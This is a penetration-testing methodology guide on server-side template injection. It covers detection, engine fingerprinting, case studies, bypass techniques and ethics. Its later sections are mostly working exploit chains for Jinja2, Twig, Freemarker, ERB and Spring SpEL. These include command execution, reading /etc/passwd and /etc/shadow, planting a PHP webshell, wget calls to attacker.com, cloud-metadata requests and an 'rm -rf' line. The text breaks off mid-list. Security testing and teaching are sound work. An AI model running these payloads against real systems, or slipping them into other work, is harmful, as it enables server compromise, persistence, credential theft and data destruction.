# 18. SSTI Testing Automation

## Expert Role

An SSTI Testing Automation Specialist is an expert in identifying and exploiting Server-Side Template Injection vulnerabilities through automated testing methodologies. This specialist understands how web applications use template engines to render dynamic content and the security implications when user input is incorporated into templates without proper sanitization. They have deep knowledge of template engine syntax across multiple frameworks including Jinja2, Twig, Freemarker, ERB, Blade, and Thymeleaf. The specialist designs automated testing frameworks that systematically test input vectors with appropriate payloads while handling various defensive measures including sandboxing, input filtering, and template restrictions. They build custom payload generation engines that adapt to different template engines and bypass techniques. The specialist understands the nuances of different SSTI types including direct injection, blind injection, and template-based code execution, and selects appropriate methods based on application behavior. They maintain comprehensive payload libraries optimized for different template engines and bypass requirements. The specialist continuously evolves their testing techniques to address modern defensive measures including template sandboxing, auto-escaping, and input validation. They build automated exploitation chains that combine SSTI with other vulnerabilities for maximum impact assessment.

## Core Concepts

### What is Server-Side Template Injection?
Server-Side Template Injection is a vulnerability that occurs when user input is embedded in a template and evaluated server-side without proper sanitization. This can lead to remote code execution, file read, and full server compromise. The vulnerability exists because template engines process user input as template syntax rather than plain text data.

### How SSTI Works
1. Application accepts user input through web forms, URL parameters, or API endpoints
2. Input is embedded in a template string that is processed by a template engine
3. Template engine evaluates the input as template syntax rather than plain text
4. Attacker's template expressions are executed server-side with application privileges
5. Output may be returned directly or executed silently

### Template Engine Categories

1. **Expression-Based Engines**: Process expressions within delimiters ({{ }}, ${}, <%= %>) to evaluate dynamic content. Examples: Jinja2, Twig, Freemarker.

2. **Code-Based Engines**: Allow execution of arbitrary code within template delimiters. Examples: ERB, Blade, Smarty.

3. **Hybrid Engines**: Support both expression evaluation and limited code execution. Examples: Thymeleaf, Mako.

### Common Template Syntax Delimiters

1. **Jinja2/Twig**: `{{ }}`, `{% %}`, `{# #}`
2. **Freemarker**: `${}`, `<# >`, `<#-- -->`
3. **ERB**: `<%= %>`, `<% %>`, `<%# %>`
4. **Blade**: `{{ }}`, `{!! !!}`, `{{-- --}}`
5. **Thymeleaf**: `${}`, `*{}`, `#{}`, `@{}`

### SSTI Vulnerability Types

1. **Direct SSTI**: User input directly evaluated in template with output returned to attacker.
2. **Blind SSTI**: Template output not directly visible, requiring indirect detection techniques.
3. **Context-Dependent SSTI**: SSTI exploitation varies based on template context (HTML, attribute, JavaScript).
4. **Chained SSTI**: SSTI combined with other vulnerabilities for extended exploitation chains.

### Template Engine Features

1. **Auto-Escaping**: Automatic HTML entity encoding of template variables to prevent XSS.
2. **Sandboxing**: Restriction of template functions and objects to prevent dangerous operations.
3. **Template Inheritance**: Template extension mechanisms that may affect exploitation.
4. **Filters/Functions**: Built-in template functions that may be abused for exploitation.
5. **Object Access**: Template engine access to underlying language objects and methods.

### RCE via SSTI Mechanisms

1. **Python/Jinja2**: Access to Python modules through object chain traversal (config, self, lipsum).
2. **PHP/Twig**: Access to PHP functions through filter abuse and callback mechanisms.
3. **Java/Freemarker**: Access to Java classes through object instantiation and method invocation.
4. **Ruby/ERB**: Direct Ruby code execution within ERB tags.

## Prerequisites

1. Strong understanding of template engine syntax across multiple frameworks including Jinja2, Twig, Freemarker, ERB, and Blade.
2. Knowledge of web application architecture including how template engines process user input and render dynamic content.
3. Familiarity with template engine security features including sandboxing, auto-escaping, and input filtering.
4. Understanding of programming languages underlying template engines (Python, PHP, Java, Ruby) for exploitation.
5. Proficiency with command-line tools including curl, custom scripting languages, and template processing utilities.
6. Experience with HTTP proxy tools like Burp Suite for intercepting and modifying requests.
7. Knowledge of encoding techniques and their application in template contexts for bypass and obfuscation.
8. Understanding of sandbox escape techniques for different template engines and their security models.
9. Familiarity with web application frameworks and their template engine configurations and defaults.
10. Basic understanding of server-side security models, privilege structures, and code execution techniques.

## Methodology

### Phase 1: Input Vector Discovery (15 lines)

Map all user-controlled input points that may be processed by template engines. Test URL parameters, form fields, HTTP headers, and API endpoints for template processing. Analyze application functionality for features that render dynamic content including email templates, PDF generation, report rendering, error pages, and custom page rendering. Review source code if available to identify template rendering functions and input handling patterns. Document all potential SSTI vectors and their apparent processing context.

### Phase 2: Vulnerability Detection (15 lines)

Test identified vectors for SSTI vulnerabilities using automated tools and manual verification. Begin with simple mathematical expressions ({{7*7}}, ${7*7}, <%= 7*7 %>) that produce observable output changes in application responses. Test common template syntax delimiters ({{ }}, {$ $}, <%= %>) to identify template processing. Analyze error messages for template engine fingerprints that reveal the specific engine in use. Validate findings through multiple testing approaches with different expression types and delimiters.

### Phase 3: Template Engine Identification (10 lines)

Identify the specific template engine and version through characteristic behavior and error messages. Test engine-specific payloads to confirm the template engine in use. Analyze template syntax, filters, and available functions to understand the engine's capabilities and restrictions. Document template engine type, version, and any observed security configurations including sandboxing, auto-escaping, and input filtering.

### Phase 4: Exploitation Strategy Selection (15 lines)

Based on template engine identification and application behavior, select appropriate exploitation techniques. Choose between direct, blind, and out-of-band methods based on response availability and template restrictions. Determine the optimal payload strategy for code execution while minimizing detection risk. Plan the exploitation sequence to maximize information gathering while maintaining testing efficiency.

### Phase 5: Sandbox Escape and RCE (15 lines)

Attempt to escape template engine sandboxes and achieve remote code execution. Use engine-specific techniques to access dangerous functions and objects. Test sandbox escape techniques including object chain traversal, filter abuse, and function override. Validate successful code execution through command output, file creation, or other observable behavior changes.

### Phase 6: Reporting and Remediation (10 lines)

Document the complete exploitation chain including prerequisites, steps, and evidence. Generate comprehensive reports with reproduction steps, risk assessment, and remediation recommendations. Prepare executive summaries for non-technical stakeholders and detailed technical reports for development teams. Provide specific guidance for implementing SSTI protections and hardening template configurations.

## Tool Arsenal

### Primary SSTI Detection Tools

1. **TInjA**: Automated SSTI detection and exploitation tool with support for multiple template engines and automatic engine identification.

2. **Template Scanner**: Custom tool for detecting SSTI vulnerabilities through automated payload testing with engine-specific detection logic.

3. **Burp Suite Extensions**: Multiple extensions including SSTI Detector for manual and automated testing with request manipulation capabilities.

4. **OWASP ZAP**: Open-source security testing tool with active scanning capabilities for SSTI and extensible scanning rules.

5. **Custom SSTI Scanner**: Scripts for detecting SSTI vulnerabilities through automated payload injection with customizable engine detection.

### Template Engine Analysis Tools

6. **Jinja2 Analyzer**: Tools for analyzing Jinja2 template syntax and identifying exploitation opportunities through object chain traversal.

7. **Twig Analyzer**: Tools for analyzing Twig template syntax and identifying exploitation opportunities through filter abuse and function invocation.

8. **Freemarker Analyzer**: Tools for analyzing Freemarker template syntax and identifying exploitation opportunities through method invocation and object access.

9. **ERB Analyzer**: Tools for analyzing ERB template syntax and identifying exploitation opportunities through Ruby code execution.

10. **Template Syntax Tester**: Tools for testing template engine syntax and identifying injection points through response analysis.

### Payload Generation Tools

11. **SSTI Payload Generator**: Custom scripts for generating context-appropriate SSTI payloads based on target engine analysis and restrictions.

12. **Polyglot Payload Generator**: Tools for generating payloads that work across multiple template engines for universal testing.

13. **Sandbox Escape Payloads**: Curated collections of payloads designed to escape template engine sandboxes through object traversal and filter abuse.

14. **RCE Payload Library**: Payloads for achieving remote code execution through different template engines with engine-specific techniques.

15. **File Read Payloads**: Payloads for reading local files through template engine-specific file access functions and object traversal.

### Sandbox Escape Tools

16. **Jinja2 Sandbox Escape**: Tools for escaping Jinja2 sandbox environments through object chain traversal and MRO manipulation.

17. **Twig Sandbox Escape**: Tools for escaping Twig sandbox environments through filter abuse and function callback mechanisms.

18. **Freemarker Sandbox Escape**: Tools for escaping Freemarker sandbox environments through method invocation and object instantiation.

19. **ERB Sandbox Escape**: Tools for escaping ERB sandbox environments through Ruby code execution and metaprogramming.

20. **Generic Sandbox Tester**: Tools for testing and identifying bypass techniques for different sandbox implementations across engines.

### RCE Exploitation Tools

21. **Command Execution Payloads**: Payloads for executing system commands through template engine-specific functions and object access.

22. **Python Code Execution**: Tools for executing Python code through Jinja2 template injection using object chain traversal and module access.

23. **PHP Code Execution**: Tools for executing PHP code through Twig and Blade template injection using filter abuse and function callbacks.

24. **Java Code Execution**: Tools for executing Java code through Freemarker template injection using method invocation and class instantiation.

25. **Ruby Code Execution**: Tools for executing Ruby code through ERB template injection using code execution within ERB tags.

### File Access Tools

26. **File Read Payloads**: Payloads for reading local files through template engine-specific file access functions and open class exploitation.

27. **File Write Payloads**: Payloads for writing files through template engine-specific functions and object manipulation techniques.

28. **Directory Traversal**: Payloads for navigating file systems through template injection using path manipulation and object access.

29. **File Content Analyzer**: Tools for analyzing and parsing file content extracted through SSTI for sensitive information identification.

30. **Configuration File Scanner**: Scripts for identifying and reading common configuration files through SSTI exploitation.

### WAF Bypass Tools

31. **SSTI Bypass Payloads**: Curated collections of payloads designed to bypass common WAF implementations and SSTI detection rules.

32. **Encoding Bypass Tools**: Scripts for applying various encoding techniques to bypass SSTI filters and input validation mechanisms.

33. **Obfuscation Tools**: Tools for creating obfuscated SSTI payloads that evade signature-based detection and pattern matching.

34. **String Concatenation**: Tools for using string concatenation to bypass keyword blocking while maintaining payload functionality.

35. **Alternative Syntax**: Tools for using alternative template syntax to bypass pattern matching in WAF rules and input filters.

### Custom Scripting Frameworks

36. **Python Jinja2**: Python template engine for building custom SSTI testing scripts with direct template processing capabilities.

37. **PHP Twig**: PHP template engine for building custom SSTI testing tools with filter abuse and function callback testing.

38. **Java Freemarker**: Java template engine for building custom SSTI testing frameworks with method invocation and object access testing.

39. **Ruby ERB**: Ruby template engine for building quick SSTI testing prototypes with code execution validation.

40. **Go html/template**: Go template engine for building high-performance SSTI testing tools with concurrency support.

### Reporting and Documentation Tools

41. **Screenshot Automation**: Tools for capturing evidence of successful SSTI exploitation with annotation and timestamp support.

42. **PoC Generator**: Scripts for generating proof-of-concept demonstrations for discovered SSTI vulnerabilities with reproduction steps.

43. **Template Diagram Generator**: Tools for visualizing template structures and injection points for vulnerability documentation.

44. **Report Templates**: Standardized templates for documenting SSTI vulnerabilities with technical details and impact assessment.

45. **Impact Assessment Tools**: Scripts for evaluating the potential impact of discovered SSTI vulnerabilities including code execution and server compromise.

## Case Studies

### Case Study 1: Jinja2 SSTI in Flask Application (20 lines)

A Flask web application implemented user profile rendering that incorporated user-supplied names into Jinja2 templates without proper sanitization. The application used render_template_string function with string concatenation instead of template parameters. The vulnerability was discovered through automated testing with TInjA, which identified SSTI through mathematical expression evaluation ({{7*7}} returning 49). The payload used Jinja2's access to Python's os module through object chain traversal: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. The exploitation yielded a reverse shell with www-data privileges through Python's subprocess module. The application server contained sensitive configuration data and had access to the database server with production data. Impact: Full server compromise through Jinja2 SSTI affecting all application data and database contents. Remediation: Implemented proper template parameterization using render_template with variable passing, removed render_template_string usage, and added input validation for all template-processed content.

### Case Study 2: Twig SSTI in PHP Application (20 lines)

A PHP application implemented email template rendering that incorporated user-supplied content into Twig templates. The application used Twig's render function with user-controlled template content without proper sandboxing. The vulnerability was identified through automated testing with custom payloads that exploited Twig's filter functionality. The payload used Twig's `_self.env.registerUndefinedFilterCallback("exec")` to register the exec function as a filter, then called it with `{{_self.env.getFilter("id")}}`. The exploitation enabled file read and command execution with the web server's privileges. The server contained database credentials and API keys for cloud services including AWS S3 buckets. Impact: Server compromise and cloud service access through Twig SSTI affecting multiple data stores. Remediation: Implemented Twig sandbox restrictions with mode allow to restrict available functions, removed user-controlled template content, and implemented proper input validation.

### Case Study 3: Freemarker SSTI in Java Application (20 lines)

A Java Spring application implemented PDF report generation that incorporated user-supplied data into Freemarker templates. The application used Freemarker's Configuration class with default settings that allowed object method invocation without restrictions. The vulnerability was discovered through automated testing with payloads that exploited Freemarker's access to Java objects. The payload used `new java.lang.ProcessBuilder('id').start()` to execute system commands through Java's ProcessBuilder class. The exploitation enabled full server compromise with the Java application's privileges. The application server was in a DMZ with access to internal database servers and Active Directory. Impact: Internal network access and database compromise through Freemarker SSTI affecting enterprise resources. Remediation: Implemented Freemarker template restrictions using the API with method invocation disabled, removed dangerous object access from template configuration, and added input validation for template-processed content.

### Case Study 4: Blind SSTI via Time Delay (20 lines)

A web application implemented dynamic page rendering that incorporated user input into templates but did not display template output directly to users. The vulnerability was identified through time-based blind SSTI testing using template engine-specific sleep functions. The payload used Jinja2's `{% for i in range(1000000) %}{% endfor %}` to introduce measurable delays in the response time. The blind SSTI was exploited to extract sensitive data character-by-character through timing variations in conditional expressions. The extraction revealed database credentials stored in the application configuration file. The credentials provided access to the production database containing all application data. Impact: Data extraction and database access through blind SSTI affecting all application data. Remediation: Implemented template parameterization, disabled user-controlled template content, and added input validation for all template-processed input vectors.

### Case Study 5: Blade SSTI in Laravel Application (20 lines)

A Laravel application implemented custom page rendering that used Blade template syntax with user-controlled content. The application used Blade's render function with user-supplied template strings without proper validation. The vulnerability was identified through automated testing with Blade-specific payloads that exploited the template engine's directive system. The payload used Blade's `@php` directive to execute arbitrary PHP code: `@php system('id') @endphp`. The exploitation enabled full server compromise with the web server's privileges. The application contained customer data and payment information. Impact: Customer data exposure and payment information theft through Blade SSTI. Remediation: Implemented Blade template restrictions, removed user-controlled template content, and added input validation for all template-processed content.

## Bypass Techniques

1. **String Concatenation**: Using string concatenation operators (`~` in Jinja2, `.` in PHP) to bypass keyword blocking while maintaining payload functionality for filter evasion.

2. **Variable Assignment**: Assigning blocked functions to variables and calling them through variable names to bypass direct function access restrictions and keyword filtering.

3. **Object Chain Traversal**: Using object chain traversal (MRO, __class__, __globals__) to access dangerous functions through indirect object references that bypass direct access restrictions.

4. **Filter Abuse**: Abusing template engine filters (registerUndefinedFilterCallback in Twig, |attr in Jinja2) to achieve code execution through seemingly benign filter functions.

5. **Encoding Bypass**: Applying various encoding techniques (URL encoding, Base64, Unicode) to bypass input filters that block SSTI-specific characters and syntax.

6. **Alternative Delimiters**: Using alternative template syntax delimiters or expressions to bypass pattern matching in input filters and WAF rules.

7. **Whitespace Manipulation**: Inserting whitespace characters (spaces, tabs, newlines) to bypass keyword-based filtering while maintaining payload functionality and template evaluation.

8. **Case Variation**: Using mixed case for function names and keywords to bypass case-sensitive pattern matching in input validation and WAF detection.

9. **Comment Injection**: Using template comments to bypass input filtering while maintaining payload structure and template engine evaluation.

10. **Nested Payloads**: Nesting SSTI payloads within other template expressions to bypass single-layer filtering and achieve code execution through indirect evaluation.

11. **Unicode Normalization**: Using Unicode characters that normalize to ASCII during template processing to bypass character-based filtering while maintaining payload functionality.

12. **Null Byte Injection**: Inserting null bytes to truncate input validation while the template engine processes the full payload, bypassing length-based restrictions.

13. **Recursive Definitions**: Using recursive template definitions to bypass depth restrictions and achieve code execution through recursive evaluation.

14. **Sandbox Escape via MRO**: Using Method Resolution Order (MRO) traversal in Python to escape sandbox environments and access restricted classes and methods.

15. **Sandbox Exception Abuse**: Abusing sandbox exception handling to bypass restrictions and achieve code execution through error-based exploitation techniques.

## Advanced Techniques

1. **Automated Template Engine Fingerprinting**: Build frameworks that automatically identify template engines through characteristic behavior, error message analysis, and payload response patterns with machine learning classification.

2. **Machine Learning Payload Generation**: Train ML models to generate SSTI payloads that evade WAF detection based on analysis of blocked vs allowed patterns and engine-specific syntax variations.

3. **Sandbox Escape Automation**: Develop automated tools for escaping template engine sandboxes through object chain traversal, filter abuse, and exception-based techniques.

4. **Blind SSTI Optimization**: Implement adaptive algorithms that optimize blind SSTI data extraction based on response time patterns, error probability analysis, and network latency considerations.

5. **SSTI Chain Detection**: Develop tools for identifying SSTI vulnerabilities that can be chained with other vulnerabilities (XSS, SSRF, file upload) for maximum impact assessment.

6. **SSTI in Modern Frameworks**: Develop specialized testing for modern frameworks (React SSR, Next.js, Nuxt.js) that may have server-side rendering with SSTI risks in component rendering.

7. **SSTI Impact Quantification**: Develop tools for quantifying the business impact of SSTI vulnerabilities including code execution metrics and data theft assessment.

8. **SSTI Defense Validation**: Build tools for validating the effectiveness of SSTI protections including sandbox configurations and input validation mechanisms.

9. **SSTI in Microservices**: Develop specialized testing for microservice architectures where SSTI may affect multiple services through shared template processing.

10. **SSTI in Serverless**: Develop testing for serverless architectures (AWS Lambda, Azure Functions) where SSTI may have different exploitation patterns and impact scope.

## Detection Indicators

1. **Expression Evaluation**: Mathematical expressions ({{7*7}}, ${7*7}) producing calculated results in application responses indicating template processing.

2. **Error Message Patterns**: Template engine-specific error messages revealing template syntax, processing details, and engine version information.

3. **Object Access Indicators**: Evidence of access to template engine objects and their properties through SSTI indicating successful exploitation.

4. **File System Access**: Evidence of file read or write operations through template engine-specific functions indicating server-side code execution.

5. **Command Execution Indicators**: Evidence of system command execution through template injection including command output or behavioral changes.

6. **Timing Variations**: Different response times for payloads that execute successfully vs those that fail, indicating template engine processing behavior.

7. **Content Changes**: Variations in response content when SSTI payloads are introduced, indicating template processing and expression evaluation.

8. **Template Syntax Revelation**: Application responses that reveal template syntax, structure, or engine information through SSTI testing and error messages.

9. **Sandbox Restriction Indicators**: Error messages or behavior indicating template engine sandbox restrictions that limit exploitation capabilities.

10. **Security Alert Patterns**: Security alerts from WAF, IDS, or SIEM systems indicating SSTI exploitation attempts and blocking actions.

## Common Pitfalls

1. **False Positive Identification**: Misidentifying template syntax errors as successful SSTI vulnerabilities without proper validation through controlled exploitation and response analysis.

2. **Ignoring Sandbox Restrictions**: Not testing for template engine sandbox restrictions that may prevent exploitation even when SSTI vulnerabilities exist in the application.

3. **Incomplete Engine Identification**: Failing to identify the specific template engine, leading to ineffective payloads and missed exploitation opportunities.

4. **Overlooking Blind SSTI**: Focusing only on visible SSTI while missing blind vulnerabilities that may still be exploitable through indirect detection techniques.

5. **Missing Chain Opportunities**: Failing to chain SSTI with other vulnerabilities for maximum impact assessment and comprehensive security evaluation.

6. **Aggressive Testing Disruption**: Performing overly aggressive SSTI testing that causes denial of service through excessive template processing or resource exhaustion.

7. **Inadequate Impact Assessment**: Not fully assessing the impact of SSTI including code execution, file access, and potential for lateral movement.

8. **Neglecting Sandbox Escape**: Not testing sandbox escape techniques that may enable exploitation despite template engine restrictions and security configurations.

9. **Incomplete Evidence Collection**: Not capturing sufficient evidence of SSTI exploitation including template processing, code execution, and data access.

10. **Missing Framework Context**: Not considering the specific web framework context that may affect SSTI exploitation, impact, and remediation approaches.

## Integration Points

1. **CI/CD Pipeline Integration**: Implement automated SSTI testing in continuous integration pipelines to detect vulnerabilities during development and prevent deployment of vulnerable template code.

2. **Template Security Integration**: Integrate SSTI testing with template engine security validation to ensure proper configurations and sandbox settings across all template processing.

3. **WAF Rule Development**: Use SSTI detection patterns to develop WAF rules that can detect and block automated SSTI exploitation attempts in production environments.

4. **SIEM Integration**: Feed SSTI detection logs into Security Information and Event Management systems for correlation with other security events and threat detection.

5. **Vulnerability Management Platform**: Integrate SSTI findings with vulnerability management systems for tracking remediation progress and prioritizing security fixes.

6. **Penetration Testing Framework**: Incorporate SSTI automation into penetration testing methodologies to improve efficiency and coverage of template security testing.

7. **Compliance Monitoring**: Use SSTI detection results to demonstrate compliance with data protection regulations requiring secure template processing and dynamic content rendering.

8. **Threat Hunting Integration**: Incorporate SSTI detection patterns into threat hunting playbooks to identify potential template injection attempts and server compromise.

9. **Incident Response Integration**: Use SSTI detection capabilities to support incident response activities involving template security and server compromise investigation.

10. **Security Training**: Use SSTI findings and automation examples to train development teams on secure template usage practices and input validation techniques.

## Reporting Templates

### Template 1: Executive Summary

**Title**: SSTI Vulnerability in [Application] [Endpoint]
**Severity**: [Critical/High/Medium/Low]
**CVSS Score**: [Score]
**Affected Components**: [List of affected endpoints]
**Business Impact**: [Description of business risk and potential server compromise]
**Remediation Priority**: [Immediate/High/Medium/Low]

### Template 2: Technical Details

**Vulnerability Type**: Server-Side Template Injection
**Template Engine**: [Jinja2/Twig/Freemarker/ERB/Blade/Thymeleaf]
**Injection Point**: [Parameter name and location]
**Sandbox Status**: [None/Active/Bypassed]
**Prerequisites**: [Required authentication level]
**Reproduction Steps**: [Step-by-step instructions]
**Payload Examples**: [Sample payloads demonstrating vulnerability]
**Evidence**: [Request/response pairs with annotations]

### Template 3: Impact Assessment

**Code Execution Potential**: [Assessment of remote code execution risk]
**File System Access**: [Types of files accessible through SSTI]
**Data at Risk**: [Sensitive data exposed through exploitation]
**Server Access Level**: [User/Root/Administrator privileges]
**Lateral Movement**: [Potential for accessing other systems through SSTI]

### Template 4: Remediation Recommendations

**Immediate Actions**: [Quick fixes to implement]
**Long-term Solutions**: [Architectural improvements]
**Template Parameterization**: [Recommended parameterization techniques]
**Sandbox Configuration**: [Template sandbox recommendations]
**Input Validation**: [Input filtering and validation guidance]

## Practice Labs

1. **PortSwigger SSTI Labs**: Complete PortSwigger's SSTI labs covering different template engines, exploitation techniques, and sandbox escape scenarios.

2. **HackTheBox SSTI Challenges**: Practice SSTI on HackTheBox challenges that require advanced sandbox escape, object chain traversal, and exploitation chains.

3. **WebGoat SSTI Modules**: Complete OWASP WebGoat's SSTI lessons covering different template engines, bypass techniques, and remediation approaches.

4. **Vulnhub SSTI Machines**: Complete vulnerable machines with SSTI focus on code execution, file access, and server compromise.

5. **Custom SSTI Lab**: Build a vulnerable web application with intentional SSTI vulnerabilities across multiple template engines to practice automated testing framework development.

## Ethics

1. Always obtain proper authorization before testing for SSTI vulnerabilities on any system or application.
2. Minimize system impact during testing by avoiding denial-of-service through template processing or resource exhaustion.
3. Do not exfiltrate or store any sensitive data discovered through SSTI exploitation beyond what is necessary for vulnerability demonstration.
4. Report all discovered SSTI vulnerabilities through responsible disclosure channels immediately with complete technical details.
5. Provide clear remediation guidance to help organizations fix identified vulnerabilities and prevent future exploitation.
6. Respect rate limits and do not perform aggressive testing without explicit permission from system owners.
7. Do not share or publish specific exploitation details for real-world SSTI vulnerabilities without proper authorization.
8. Consider the potential impact of testing activities on system stability and template processing performance.
9. Maintain strict confidentiality of all vulnerability information discovered during authorized testing activities.
10. Follow all applicable laws and regulations regarding unauthorized access to computer systems and data protection requirements.
11. Use non-destructive payloads during testing phases to avoid system damage or data corruption.
12. Avoid executing dangerous commands during SSTI exploitation testing unless explicitly authorized for impact demonstration.
13. Document all testing activities for accountability, knowledge transfer, and compliance with engagement requirements.

## Quick Reference

### Common SSTI Payloads
- Jinja2: `{{7*7}}`, `{{config}}`, `{{self.__init__.__globals__}}`, `{{lipsum.__globals__['os'].popen('id').read()}}`
- Twig: `{{7*7}}`, `{{_self.env}}`, `{{app}}`, `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- Freemarker: `${7*7}`, `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- ERB: `<%= 7*7 %>`, `<%= system("id") %>`, `<%= `id` %>`
- Blade: `{{7*7}}`, `{{app}}`, `@php system('id') @endphp`
- Thymeleaf: `${7*7}`, `*{7*7}`, `#{7*7}`

### Template Syntax Delimiters
- Jinja2/Twig: `{{ }}`, `{% %}`, `{# #}`
- Freemarker: `${}`, `<# >`, `<#-- -->`
- ERB: `<%= %>`, `<% %>`, `<%# %>`
- Blade: `{{ }}`, `{!! !!}`, `{{-- --}}`
- Thymeleaf: `${}`, `*{}`, `#{}`, `@{}`

### Testing Checklist
- [ ] Identify all input parameters and test for template expression evaluation
- [ ] Test common template syntax delimiters across all input vectors
- [ ] Identify template engine type through error messages and response analysis
- [ ] Test for sandbox restrictions and security configurations
- [ ] Test sandbox escape techniques for identified template engine
- [ ] Validate code execution capability through command output or file creation
- [ ] Test file read and write capabilities through template functions
- [ ] Document exploitation chain including prerequisites, steps, and evidence
- [ ] Assess impact including code execution, data access, and lateral movement
- [ ] Provide remediation recommendations for template security hardening

### Bypass Techniques Quick List
- String concatenation with operators (~, ., +)
- Variable assignment and indirect function calls
- Object chain traversal (__class__, __globals__, MRO)
- Filter abuse and callback registration
- Encoding bypass (URL, Base64, Unicode)
- Alternative delimiters and syntax variations
- Whitespace manipulation and case variation
- Comment injection and nested payloads
- Unicode normalization and null byte injection
- Recursive definitions and sandbox exception abuse

### Impact Assessment Matrix
- Remote code execution = Critical
- File read/write = High
- Database access = High
- Internal network access = Medium
- Information disclosure = Low/Medium
- Sandbox bypass = Medium/High

### Tools Quick Reference
- TInjA: Primary SSTI detection and exploitation
- Burp Suite: Manual testing and request analysis
- Custom scripts: Engine-specific testing and bypass development
- Sandbox escape tools: Restriction bypass and code execution
- Payload generators: Exploitation development and automation

---

## Deep Dive: Engine-Specific Exploitation Chains

### Jinja2 (Flask/Django) Full Exploitation Chain
```python
# Stage 1: Detect Jinja2
{{7*7}}                    # Returns 49 = expression mode
{{config}}                 # Shows config object

# Stage 2: Discover available classes
{{''.__class__.__mro__[2].__subclasses__()}}  # List all subclasses

# Stage 3: Locate useful classes (common indices)
# os._wrap_close is usually index 132-160
# warning.catch_warnings is usually index 59-79
{{''.__class__.__mro__[2].__subclasses__()[132]}}
{{''.__class__.__mro__[2].__subclasses__()[59]}}

# Stage 4: RCE via os._wrap_close
{{''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# Stage 5: RCE via warning.catch_warnings
{{''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__['__import__']('os').popen('id').read()}}

# Stage 6: File read via subprocess
{{''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__['__import__']('subprocess').check_output(['cat','/etc/passwd']).decode()}}

# Stage 7: Write webshell for persistence
{{''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['popen']('echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/shell.php').read()}}
```

### Twig (Symfony) Full Exploitation Chain
```php
// Stage 1: Detect Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{["id"]|filter("system")}}
{{["cat /etc/passwd"]|filter("system")}}

// Stage 2: RCE via filter chain
{{["ls -la"]|filter("system")}}
{{["cat /etc/shadow"]|filter("system")}}
{{["wget http://attacker.com/shell.php -O /var/www/html/shell.php"]|filter("system")}}

// Stage 3: File operations
{{["cat /etc/passwd"]|filter("system")}}
{{["echo 'data' > /tmp/test"]|filter("system")}}
{{["rm -rf /important/file"]|filter("system")}}

// Stage 4: Network pivoting
{{["curl http://169.254.169.254/latest/meta-data/"]|filter("system")}}
{{["wget -q -O- http://attacker.com/callback"]|filter("system")}}
```

### Freemarker (Java) Full Exploitation Chain
```ftl
<#-- Stage 1: Detect Freemarker -->
${7*7}
<#attempt>${7*7}<#recover></#attempt>

<#-- Stage 2: Object manipulation -->
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()}

<#-- Stage 3: RCE via TemplateClassInitializer -->
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

<#-- Stage 4: RCE via JythonRuntime -->
<#assign ex="freemarker.template.utility.JythonRuntime"?new()>
<@ex>
import os
os.system('id')
</@ex>

<#-- Stage 5: Constructor manipulation -->
<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=classloader.loadClass("freemarker.template.DefaultObjectWrapper")>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance().getMethod("getInstances",null).invoke(null,null).get("execute")("id")}

<#-- Stage 6: File read -->
<#assign classloader=object.class.protectionDomain.classLoader>
<#assign file=classloader.loadClass("java.io.File")>
<#assign fis=classloader.loadClass("java.io.FileInputStream")>
<#assign isr=classloader.loadClass("java.io.InputStreamReader")>
<#assign br=classloader.loadClass("java.io.BufferedReader")>
<#assign f=file.newInstance("/etc/passwd")>
<#assign reader=fis.newInstance(f)>
<#assign isreader=isr.newInstance(reader,"UTF-8")>
<#assign br=br.newInstance(isreader)>
${br.readLine()}
```

### ERB (Ruby/Rails) Full Exploitation Chain
```ruby
# Stage 1: Detect ERB
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>

# Stage 2: RCE via backticks
<%= `cat /etc/passwd` %>
<%= `wget http://attacker.com/shell.php -O /var/www/html/shell.php` %>

# Stage 3: File read
<%= IO.read("/etc/passwd") %>
<%= File.open("/etc/passwd").read %>
<%= IO.popen("cat /etc/passwd").read %>

# Stage 4: Object manipulation
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").readlines %>

# Stage 5: Network operations
<%= IO.popen("curl http://169.254.169.254/latest/meta-data/").readlines %>
<%= system("wget http://attacker.com/callback -q -O-") %>
```

### Spring (Java) Full Exploitation Chain
```java
// Stage 1: Detect Spring Expression Language (SpEL)
${7*7}
#{7*7}

// Stage 2: RCE via Runtime.exec
#{T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}

// Stage 3: RCE via ProcessBuilder
#{new java.lang.ProcessBuilder(new String[]{'bash','-c','id'}).start()}

// Stage 4: File read
#{T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd'))}

// Stage 5: Object manipulation
#{T(java.lang.System).getenv()}
#{T(java.lang.System).getProperty('user.home')}
#{@java.lang.Runtime@getRuntime()}

// Stage 6: Method invocation
#{"".getClass().forName("java.lang.Runtime").getMethod("exec","").invoke("")}

// Stage 7: Advanced - load arbitrary class
#{T(java.lang.ClassLoader).getSystemClassLoader().loadClass("com.example.Evil").newInstance()}
```

---

## Sandbox Escape Techniques

### Python Sandbox Escape (Jinja2 context)
```python
# Method 1: Subprocess via __import__
{{''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__['__import__']('subprocess').check_output(['id'])}}

# Method 2: os module via __builtins__
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Method 3: eval/exec via __builtins__
{{config.__class__.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}

# Method 4: warning.catch_warnings
{{''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__['__import__']('os').popen('id').read()}}

# Method 5: subprocess.check_output with shell
